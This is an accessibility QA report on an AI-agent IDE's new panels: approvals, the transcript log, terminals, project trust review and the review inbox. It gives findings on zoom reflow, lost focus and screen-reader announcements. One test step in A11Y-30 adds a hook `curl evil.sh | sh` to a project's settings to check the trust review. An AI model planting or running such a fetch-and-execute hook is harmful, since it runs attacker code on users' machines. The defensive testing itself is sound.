# Iryna (accessibility user): Round 4 (2026-11-24)

Build: 81d16b1 on main, headless (fake-agent and fake-claude build), Playwright
Chromium, 1280x800. Also 640x400 and 512x400 CSS px (200% zoom of a 1280 px and
a 1024 px window), forced colours on and off.
Scope: what landed since round 3 (`ca0af74..81d16b1`): terminals (xterm.js
screen reader mode, focus, announcements), the Agents panel and its transcript,
Approvals, Claude setup and the project trust review, the review inbox
(Alt+Shift+R) with direct-mode review items, plus a short re-check of
A11Y-21/22/23. Fixtures: `small` (seeded). Agents: the scripted fake agent, and
the real Claude driver against fake-claude playing `edit_allowed`,
`denied_outside_folder`, `interrupted` and `subagent`. To get a review item
with a diff, the scripts changed `src/lib.rs` and wrote a 400-line
`notes.txt` while a direct session ran, so both files are "changed outside the
agent". Scripts s1-s15 live in a scratch folder. A MutationObserver logged
every change inside `aria-live`, `role=status`, `role=alert` and `role=log`
regions, which approximates what a screen reader would announce.

## Summary

Iryna can run an agent, hear an approval request, answer it with Y or N, and
review and approve a diff without sight. The approval cards, the inbox dialog
and the diff table are well built, and all three round-3 re-checks are fixed.
The worst problems are layout and focus. At 200% zoom of a 1024 px window, the
main area and the inbox diff are 0 px wide. Six buttons in the new panels drop
focus to `<body>` when pressed, one of them inside the modal inbox. The
transcript log reads out whole tool outputs, including several hundred
characters of internal Claude text. The terminal is silent until she finds a
palette command. Overall she can do the job, but these new panels need more
effort from her than the tree and editor do.

## Re-check of round 3

| ID      | Round | Severity then | Status now | Notes                                                                                                                                                                                                                                                                                                                                                                                             |
| ------- | ----- | ------------- | ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| A11Y-21 | 3     | blocker       | fixed      | With the socket closed and reconnects going to a dead port, ArrowRight on `docs` returns at once (`page.evaluate` answered in 39 ms). The row reads "docs could not load, collapse and expand to retry", and the tree has `alert: connection to core closed`. The status says "Connection to core lost, reconnecting…" (`s14/disconnected.png`).                                                  |
| A11Y-22 | 3     | minor         | fixed      | The close prompt is a native modal `<dialog>`. Tab cycles Save → Don't save → Cancel → Save, and Escape returns focus to `tab "lib.rs, unsaved changes"`. Its role is now `dialog`, not `alertdialog`. That is fine, because the question is its name.                                                                                                                                            |
| A11Y-23 | 3     | major         | fixed      | Diffs are a `table "Changes"` with `aria-rowcount` and rows that carry `aria-rowindex` (for example `3:1 1 unchanged line 1: …`). N and P move between changes and announce "Change 1 of 1: removed line 2: a + b", then "No more changes." and "No earlier changes." There are visible Previous change and Next change buttons. Checked inside the review inbox. Polish items are under A11Y-35. |

## Findings

### A11Y-26 major: at 200% zoom the editor and the inbox diff shrink to nothing

- **Area:** ui/src/shell (three-column layout), ui/src/inbox (Inbox.svelte grid)
- **Steps:** 1. Open `demo-app` and start an agent session, so the right column shows Approvals and Agents. 2. Set the viewport to 640x400 (200% of 1280 px), then to 512x400 (200% of 1024 px). 3. Press Alt+Shift+R to open the review inbox for an item with two files.
- **Expected:** At 200% zoom the side columns collapse, stack or become resizable, so the editor and the diff keep a readable width. Nothing scrolls sideways (WCAG 1.4.10 Reflow).
- **Actual:** The sidebar stays 260 px and the right column stays 339 px. At 640 px, `main` is 40 px wide, and "Open a file from the tree on the left" wraps to one word per line (`s5/z200-approval.png`). At 512 px, `main` is 0 px wide, the header is 600 px in a 512 px window, and the page scrolls sideways. In the inbox, the diff column is 90 px wide at 640 px (`s12/z200-inbox.png`). At 512 px it is 0 px wide: `[data-testid=inbox-diff] w=0`, and the inbox body has `scrollWidth 580` in a 462 px box (`s13/inbox-512.png`). The file list keeps a fixed 240 px.
- **Why it matters for Iryna:** at her usual zoom she cannot see the file she opens or the diff she has to approve. With a 1024 px window the diff is gone entirely, and she is left with the screen reader alone for the review step.
- **Suggested fix:** below about 900 CSS px, stack the shell's right column under the main area or make it a collapsible drawer. Make the sidebar width shrinkable (A11Y-10 still applies). In the inbox, below about 800 px, switch from columns to one column: items, then decision, then files as a select, then the diff at full width. Add an e2e check at 512x400 that `main` and the inbox diff are at least 300 px wide.

### A11Y-27 major: pressing a button that then disappears drops focus to the page

- **Area:** ui/src/agents (AgentsPanel.svelte, setup/ProjectTrust.svelte, setup/ClaudeSetup.svelte), ui/src/inbox (Inbox.svelte)
- **Steps and results** (each from the keyboard, Enter on the focused button, then `document.activeElement`):
  1. Agents: a working session, Interrupt → `BODY` (s11).
  2. Project trust: Review and trust… → `BODY`. Trust project → the file tree `DIV role=tree`. Review on changed settings → `BODY` (s8).
  3. Claude setup: Change path → `BODY`, although a "Path to claude" field appears. Search automatically → `BODY` (s8, s9).
  4. Review inbox, inside the `aria-modal` dialog: Reject…, then Keep reviewing → `BODY`. Approve and commit → `BODY` (s4).
- **Expected:** Focus moves to the control that replaces the button, or to the next sensible one. Interrupt → Stop or the reply box. Review and trust… → the first item of the review or the Trust project button. Trust project → the trust heading or the new Review button. Change path → the path field. Keep reviewing → Reject…. Approve → the item heading or the outcome text. Focus never leaves a modal dialog.
- **Actual:** As listed. In the inbox, focus on `<body>` puts her outside a dialog that claims to be modal. Her next Tab starts from the top of the page, and the reader stops announcing anything.
- **Why it matters for Iryna:** each drop leaves her with silence and no position. She has to find her place again by landmarks, and this happens at the very moments she is making a decision: trust, interrupt, approve or reject.
- **Suggested fix:** after each of these actions, `await tick()` and focus the replacement element. The Approvals panel already does this after an answer, and the inbox does it for Reject…. Add one component test per case that checks `document.activeElement` after the press.

### A11Y-28 major: the transcript log reads out whole tool outputs and internal text

- **Area:** ui/src/agents (Transcript.svelte)
- **Steps:** 1. With `--claude interrupted`, start the recorded ping task, allow it, and press Interrupt. 2. With `--claude subagent`, run the recorded Task prompt. 3. With `--claude edit_allowed`, run the typo fix.
- **Expected:** The `role="log"` region announces a short line for each message, such as "Claude: …", "Tool Bash: Run ping -c 120 127.0.0.1", "Tool failed: interrupted" or "Tool result, 4 lines". The full output can be read on demand, for example in a collapsed `<details>` or by moving to the item.
- **Actual:** Every `tool_result` is added to the live log in full, clipped only at 2,000 characters. After the interrupt, the log announced about 700 characters starting "The user doesn't want to proceed with this tool use. The tool use was rejected (eg. if it was a file edit, the new_string was NOT written…" (s11). The subagent run announced "Async agent launched successfully. (This tool result is internal metadata — never quote or paste any part of it, including the agentId below…" (s15). A Read result is spoken with its line numbers run together: "Tool result 1 # Demo 2 3 This is teh demo. 4" (s9). Each turn also ends with "Turn ended: 64,044 tokens in, 372 out, $0.0024". The tool call itself reads "Tool Agent, Use Agent", which tells her nothing.
- **Why it matters for Iryna:** a polite log queues all of this, so she hears minutes of text meant for the model before the one line she needs, "Claude: Done.". Stopping speech also drops the useful part. With real sessions (`cat` of a file, test output) this gets much worse.
- **Suggested fix:** in the live log, render tool results as a one-line summary ("Tool result: 4 lines" or "Tool failed: interrupted"), with the output in a `<details>` or `<pre>` outside the live region (or `aria-live="off"` on the output). Name Agent and Task calls by their description ("Start subagent: read README.md"). Keep turn usage in the session's status line instead of the log.

### A11Y-29 major: terminal output is invisible to a screen reader until she finds a palette command

- **Area:** ui/src/terminal (Terminals.svelte, TerminalView.svelte)
- **Steps:** 1. Press Ctrl+`and type`echo hello-$((40+2))`Enter. 2. Read the terminal panel (ariaSnapshot). 3. Open the palette, run "Toggle screen reader mode in terminals", and type`echo second-$((1+1))`. 4. Press Tab, then Shift+Tab. 5. Reload.
- **Expected:** Terminal output can be reached by default, or there is a visible, named toggle (`aria-pressed`) in the terminal bar that remembers its state. Turning it on or off is announced. The terminal input describes how to leave it.
- **Actual:** Screen reader mode is off by default. The panel exposes only `tabpanel "Terminal 1"` with `textbox "Terminal input"`, and no output at all. Nothing is announced when the command runs. The only way to turn it on is a palette command. Running it announces nothing, and the state is not persisted (`let screenReader = $state(false)`). With it on, xterm works well: rows become a list, the output "second-2" is announced, and `seq 1 300` gives "Too much output to announce, navigate to rows manually to read" (s7). Tab stays in the shell, as it should, and Shift+Tab leaves to "Hide terminals". Nothing tells her this: the textarea has no `aria-describedby`. When the shell exits, the `role="status"` paragraph "Terminal 1: Process exited with code 127." is inserted together with its text, which many screen readers do not announce.
- **Why it matters for Iryna:** she opens a terminal, runs a command and hears nothing. That looks like a broken terminal, not a setting. She has to know the command's name to fix it, and she has to fix it again after every reload.
- **Suggested fix:** add a toggle button "Screen reader mode" with `aria-pressed` to the terminal bar, persist the setting, and say "Screen reader mode on" in a status region. Consider turning it on by default: its cost is small at 5,000 lines of scrollback. Give the terminal input `aria-describedby` with "Shift+Tab leaves the terminal, Ctrl+` hides it". Keep one exit-status live region per tab mounted, and fill in its text later.

### A11Y-30 major: the trust review's added and removed entries sound the same

- **Area:** ui/src/agents/setup (ProjectTrust.svelte)
- **Steps:** 1. Give `demo-app` a `.claude/settings.json` with a PostToolUse hook and env `FOO`, and trust it. 2. Change the file so it adds a Bash hook `curl evil.sh | sh` and drops `FOO`. 3. Press Review.
- **Expected:** Each entry says whether it was added or removed, in words that the reader speaks, for example the text "Added:" or "Removed:" (visually hidden if needed).
- **Actual:** The sign is `<span class="sign" aria-label="Added">+</span>`. An `aria-label` on a plain `span` is ignored: the tree shows `text: +` and `text: −` (s8). Depending on the punctuation level, NVDA says "plus" and "minus" or nothing, so "curl evil.sh | sh" and "FOO" can sound alike. Focus also drops on Review (A11Y-27). The general `note` "Some of what was added runs commands on your computer." is good.
- **Why it matters for Iryna:** this is a security decision. She has to know that a command runner was added, not removed, before she presses "Trust the new settings".
- **Suggested fix:** replace the `aria-label` with `<span aria-hidden="true">+</span><span class="visually-hidden">Added:</span>`, and the same for Removed. Alternatively, group the entries under "Added" and "Removed" subheadings.

### A11Y-31 minor: agent announcements start with an 80-character task title and include button text

- **Area:** ui/src/notify (agent-events.ts, Notifications.svelte), ui/src/approvals (describe.ts)
- **Steps:** 1. With `--claude edit_allowed`, start "Fix the typo in README.md with the Edit tool. Do not run commands and do not change anything else."
- **Expected:** The urgent part comes first and is short, for example "Approval needed: Edit README.md, from Fix the typo in README.md…". Paths are relative to the project.
- **Actual:** The assertive region announces "Fix the typo in README.md with the Edit tool. Do not run commands and do not cha… needs approval: Edit /tmp/ovra-ux-3XGicq/demo-app/README.md Review ×". The `Review` and `Dismiss notification` buttons are inside the live region, so their text is announced too. The approval card's heading is the same absolute path. The "finished and waits for you" announcement also starts with the full title. Paths written outside the project, as in `denied_outside_folder`, read "Write /notes.txt".
- **Why it matters for Iryna:** she hears her own prompt back before learning what is asked. An assertive announcement of about 150 characters cuts off whatever she was reading.
- **Suggested fix:** use "Approval needed: <action>" with the session name last, shortened to about 30 characters. Show paths relative to the project root, and mark paths outside it as "outside the project: /notes.txt". Put the toast buttons outside the `aria-live` element (render the text in the live region and the buttons next to it).

### A11Y-32 minor: the approval card does not say why Allow is unavailable, and early keys do nothing silently

- **Area:** ui/src/approvals (Approvals.svelte)
- **Steps:** 1. Start a session. As the request arrives, press Alt+Shift+A, then Y at once. 2. Wait 500 ms.
- **Expected:** While the request is not yet answerable, Allow and Deny explain why ("ready in a moment"). An early Y gets a short polite response ("Just arrived, press Y again"), and the change to ready is announced once. On focus, the card reads the reason the agent asks.
- **Actual:** Allow and Deny are `aria-disabled="true"` with no explanation. Y is ignored with no feedback (`after early Y: groups=1`). The change to ready is silent. On focus, the card reads its name ("Run ls -la") and its description: the session line and the key hint. "Why it asks: Ovra asks before an agent changes files outside its folder. (hook)" and the details (command, file, content) are left out, so she has to browse into the card to hear them. Good: focus is never stolen, Y and N move focus to the next card, and Escape returns focus to where it was.
- **Why it matters for Iryna:** the 500 ms guard is right, but from her side a Y that does nothing looks like a broken shortcut. She may then press Tab, and Enter on Allow later without having heard the reason.
- **Suggested fix:** add `aria-describedby` on the disabled buttons pointing at hidden text "Can be answered in a moment". Announce "Ready to answer" politely when the card arms, if it has focus. Add the reason (`approval-reason`) to the card's `aria-describedby`.

### A11Y-33 minor: Claude setup errors are not tied to the path field or announced

- **Area:** ui/src/agents/setup (ClaudeSetup.svelte)
- **Steps:** 1. With `--claude edit_allowed`, press Change path, type `/nope/claude` and press Enter. 2. Press Search automatically.
- **Expected:** The field gets `aria-invalid="true"` and `aria-describedby` pointing at "Nothing was found at /nope/claude…". The new state ("Claude is not installed", then "Claude 2.1.331 is ready") is announced.
- **Actual:** Focus stays in the field, but it has `invalid=null describedby=null`. The heading changes from "Claude 2.1.331 is ready" to "Claude is not installed" without any live region (the live log stayed empty). After Search automatically, focus drops to `<body>` (A11Y-27) and "ready" is not announced (s9).
- **Why it matters for Iryna:** she presses Enter and hears nothing. She cannot tell whether the path was accepted.
- **Suggested fix:** add a `role="status"` line with the setup state, `aria-invalid` and `aria-describedby` on the path field when the state is not ready, and focus the field or the heading after each action.

### A11Y-34 minor: in the inbox, Escape in the reject confirmation closes everything, and approve does not say what was committed

- **Area:** ui/src/inbox (Inbox.svelte)
- **Steps:** 1. Open the inbox and press Reject…. Focus is on "Reject the changes". 2. Press Escape. 3. Reopen, tick "Commit the agent's files", type "Fix add overflow" and press Approve and commit.
- **Expected:** The first Escape cancels the confirmation and puts focus back on Reject…, as the comment box already does for its draft. After approving, the outcome says whether a commit was made and which files it contains. The approved item still lists what was approved.
- **Actual:** Escape closes the whole dialog (`dialog visible=false`). After approving, the status says only "Approved.". The item now reads "Approved 0 files" and "This review has no files." because the core returned `files: []`. Here all files were changed outside the agent, so nothing was the agent's to commit, and nothing said so. The decision group (Approve, Reject…) also comes before the files and the diff, in both reading order and Tab order.
- **Why it matters for Iryna:** after one Escape she loses her place in the review. After approving, she cannot confirm by ear what she approved, or that her commit was empty.
- **Suggested fix:** handle Escape in the confirm group (call `preventDefault` and cancel). Make the outcome text say "Approved and committed 2 files as …" or "Approved. Nothing to commit: no files were changed by the agent." Keep the file list of a decided item. Consider moving the decision group after the diff, or adding a "Skip to decision" link.

### A11Y-35 polish: small contrast and focus gaps in the new diff and inbox

- **Area:** ui/src/viewers (PatchView.svelte), ui/src/inbox
- **Steps:** Open the inbox diff and measure with computed styles.
- **Expected:** Text at least 4.5:1, and a focus ring that matches the rest of the app.
- **Actual:** Line numbers on added rows are #8a8a96 on #16301e, 4.17:1. Previous change and Next change are unstyled browser buttons (light #efefef) with Chromium's `auto 1px #101010` focus ring, unlike the 2 px #7aa2ff ring everywhere else. Context rows read "1 1 unchanged line 1: …", with both numbers spoken. Everything else measured is fine: inbox state 9.9-12.7:1, meta 6.9-8.8:1, transcript and agents text 8.8:1, header count 10:1, toast 12.3:1.
- **Why it matters for Iryna:** these are small things, but she notices every inconsistent focus ring at 200% zoom.
- **Suggested fix:** use #9a9aa6 or lighter for numbers on coloured rows. Use the app's button style and focus ring for the patch buttons. Make the numbers `aria-hidden`, since the hidden "line N" text already gives the number.

## What worked well

- Approvals: each card is a `group` named after the action ("Run ls -la", "Edit README.md"), and the details are a `dl` (command, description, old string, new string). Y, N and Shift+N work on a focused card. After an answer, focus moves to the next card, or to the heading when the list is empty. Escape returns focus to where she was. A new request is announced assertively and never steals focus. Answering from the deny-with-message field with Ctrl+Enter works.
- The review inbox is a real modal dialog: `aria-modal`, Tab and Shift+Tab are trapped, focus starts on the current item and returns to where it was. The item and file lists use arrow keys with roving `tabindex` and `aria-current`. Files say "added, +400 −0, Changed outside the agent" in words, not colour. The reject confirmation is a named group that explains what reject does. Outcomes are announced in a status region.
- The diff is a `table` with row count and row index, N and P announce changes, and the re-checked A11Y-21, A11Y-22 and A11Y-23 are fixed.
- With screen reader mode on, the terminal is good: output is announced, floods are throttled, tabs follow the tab pattern, and Shift+Tab gets out.
- The Agents panel uses real labels, `role="status"` for the session state and `role="log"` for the transcript. The Claude setup error explains itself and lists the install commands as text.
- Contrast in all new panels is 6.9:1 or better. Forced colours keep the card, toast and dialog borders (`s5/fc-approval.png`, `s12/fc-inbox.png`).
